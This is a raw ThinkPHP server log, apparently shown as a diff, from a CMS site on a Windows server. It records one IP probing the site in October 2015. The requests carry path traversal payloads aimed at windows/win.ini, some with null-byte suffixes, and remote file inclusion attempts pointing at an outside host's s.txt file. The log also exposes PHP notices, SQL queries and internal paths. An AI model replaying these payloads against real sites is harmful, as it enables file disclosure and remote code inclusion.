+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:19:20+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001151s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001311s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.067305s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000489s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000268s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.098278s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002521s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.100994s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025094s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.126116s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.127647s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.129149s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.130448s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006215s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.132468s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002001s ]
+
+[ 2015-10-14T12:19:20+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000857s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000996s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035745s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000343s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000296s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.066913s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002238s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.069253s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020438s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.089797s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091347s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.092955s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.094453s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006931s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.096838s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001986s ]
+
+[ 2015-10-14T12:19:21+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000913s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001057s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035070s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000503s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000222s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.063670s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002188s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.065951s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022543s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.088572s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.089997s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.091942s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.093333s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006271s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.094941s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001616s ]
+
+[ 2015-10-14T12:19:21+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000863s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000989s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035232s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000502s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000285s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.062577s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002210s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.064875s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023535s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.088487s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.089892s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.091272s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.092515s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005559s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.094144s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001636s ]
+
+[ 2015-10-14T12:19:21+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:19:52+08:00 ] ERR: (ThinkException) 非法操作:../../../../../../../../windows/win.ini.jpg
+[ 2015-10-14T12:19:53+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000944s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001098s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:19:53+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001160s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001390s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.030369s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.002040s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000298s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.074159s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001783s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.076033s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031404s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.107560s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.109614s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.111139s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.112636s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006467s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.114148s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001434s ]
+
+[ 2015-10-14T12:19:53+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&state=594&from=timeline&isappinstalled=0
+NOTIC: [32] PHP Startup: Unable to load dynamic library 'D:\WebServer\php-5.2.5 (x64)\ext\php_fileinfo.dll' - �Ҳ���ָ����ģ�顣
+ Unknown 第 0 行.
+
+[ 2015-10-14T12:20:18+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000626s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000775s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035002s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000438s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000211s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.060474s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000617s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.061199s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.015267s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.076531s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.077026s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077525s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.077865s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001931s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.078555s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000711s ]
+
+[ 2015-10-14T12:20:21+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000655s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000791s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.017300s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.003792s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000268s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.045202s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000578s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045865s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019089s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.065119s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.065767s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.066402s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.066841s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002454s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.067659s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000887s ]
+
+[ 2015-10-14T12:20:21+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=http://120.26.55.211/s.txt&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000900s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001031s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.017671s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000485s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000281s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.046649s ]
+INFO: [ view_template ] --END-- [ RunTime:0.003248s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.050114s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.027129s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077213s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.078941s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.080322s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.081538s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005969s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083282s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001817s ]
+
+[ 2015-10-14T12:20:21+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=http://120.26.55.211/s.txt&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000897s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001185s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.007313s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000316s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000520s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.029893s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000666s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.030673s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020855s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.051595s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.052188s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.052761s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.053085s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002083s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.053812s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000687s ]
+
+[ 2015-10-14T12:20:45+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:20:53+08:00 ] ERR: (ThinkException) 无法加载模块:http://120.26.55.211/s.txt
+[ 2015-10-14T12:20:53+08:00 ] ERR: (ThinkException) 非法操作:http://120.26.55.211/s.txt
+[ 2015-10-14T12:20:53+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=http%3A%2F%2F120.26.55.211%2Fs.txt&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000930s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001094s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:20:53+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=http%3A%2F%2F120.26.55.211%2Fs.txt&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000545s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000676s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.032676s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000403s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000215s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.055165s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000605s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.055919s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019197s ]
